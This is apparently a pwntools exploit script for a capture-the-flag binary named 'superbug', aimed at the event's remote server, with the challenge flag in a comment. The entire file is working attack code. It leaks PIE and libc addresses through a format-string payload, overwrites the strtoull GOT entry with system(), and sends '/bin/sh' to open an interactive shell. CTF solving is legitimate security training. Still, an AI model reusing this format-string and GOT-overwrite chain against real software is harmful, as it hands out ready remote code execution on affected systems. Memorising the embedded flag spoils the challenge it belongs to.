#exploit for Superbug
#evlz{w0w_very_ep1c_w31rd_b1n4ry_f0r_pwn1n6}ctf
from pwn import *
import time
elf = ELF("./superbug")
context.binary=elf
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
ld = ELF("./ld-2.31.so")
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('pwn.game.alcapwnctf.in',26337)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def name(name):
	sla(">> ",name)

def aw(addr,data):
	sla(">> ",str(2))
	sla(">> ",addr)
	time.sleep(0.1)
	target.send(data)
	
payload="%13$p%15$p"
name(payload)
target.recvuntil("see ")
leaks=target.recvuntil(" in ac").strip(" in ac")
pie_base=int(leaks[2:14],16)-0xd28
stroull_got=hex(pie_base+0x202058)[2:]
libc_base=int(leaks[16:28],16)-0x0270b3
libc_system=libc_base+0x055410
aw(stroull_got,p64(libc_system))
sla(">> ","/bin/sh\x00")
target.interactive()
